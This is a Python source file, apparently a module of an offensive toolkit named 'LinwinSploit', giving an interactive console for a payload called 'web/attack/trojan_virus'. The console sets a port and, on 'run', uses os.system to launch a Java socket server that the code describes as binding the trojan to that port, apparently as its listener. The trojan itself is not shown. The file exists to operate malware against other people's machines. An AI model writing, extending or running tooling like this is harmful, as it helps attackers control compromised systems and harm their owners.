import main as main
import os


class attack:
    connect: str = "Default"
    port: int = 8888


attack = attack()


def show_options():
    print()
    print(" ++++")
    print(" | host: " + attack.connect)
    print(" | port: " + str(attack.port))
    print(" | Payload Name: web/attack/trojan_virus")
    print(" ++++")
    print()


def setHost(host: str):
    attack.connect = host


def web_control_console(payload: str,jre: str,runPath: str):
    print()
    print("Enter 'show options' show all the options you must be write.")
    print("Enter 'set [VALUE] [CONTENT]' set the attack value.")
    print("Enter 'help' get some help information.")
    while True:
        try:
            command = input("LinwinSploit-" + main.version + "(web/attack/trojan_virus) $ ")
            command = command.strip()

            if command == 'show options':
                show_options()
                continue
            if command == "help":
                print("""
    1. set port [Port]              Set your trojan's connect port.
    2. run                          listen on a port and accept the message.
    
    For example:
    1. set port 8888
                """)

            if command.startswith("set port "):
                try:
                    port: int = int(command[len("set port "):len(command)])
                    attack.port = port
                except:
                    print("INPUT PORT MUST BE 'INT' TYPE")
                    continue

            if command == 'exit':
                break

            if command == 'run':
                #print(jre)
                print("The Web Trojan was bind in this host's "+str(attack.port)+" port.")
                # print("cd "+runPath+"/../Module/web/attack/trojan_virus/ && "+jre+" -jar SocketServer.jar "+str(attack.port))
                os.system("cd "+runPath+"/../Module/web/attack/trojan_virus/SocketServer/bin/ && "+jre+" -jar SocketServer.jar "+str(attack.port))
        except BaseException:
            continue

    main.main()
